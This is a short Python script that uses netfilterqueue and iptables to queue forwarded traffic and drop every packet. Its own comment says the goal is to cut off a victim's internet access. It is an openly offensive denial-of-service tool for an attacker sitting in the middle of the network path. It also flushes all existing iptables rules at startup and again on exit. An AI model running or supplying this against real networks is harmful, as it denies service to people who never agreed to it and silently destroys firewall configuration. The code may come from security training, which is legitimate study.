import netfilterqueue
import optparse
import os


# get arguments q
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-q", "--queue_position", dest="queue_position",
                      help="queue position of iptable, for exemple '0'")
    (options, arguments) = parser.parse_args()
    return int(options.queue_position)

os.system('iptables --flush')
# subprocess.call('sudo apt-get install iptables', shell=True)

# use de funtion get_arguments to get queueu position
queue_position = get_arguments()

# create a command to save information in iptable
s_iptable = f'iptables -A FORWARD -j NFQUEUE --queue-num {str(queue_position)}'

# call function
os.system(s_iptable)
print(s_iptable)


# function to execute a drop packet and cut the internet access of victim
def process_packet(packet):
    print(packet)
    packet.drop()


# use function NetFilterQueue to execute a function in information recive
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(queue_position), process_packet)
    queue.run()

# if cancell process execute the flush in iptables
except KeyboardInterrupt:
    os.system('iptables --flush')
    print("[-] Stop Program IPTABLES deleted")
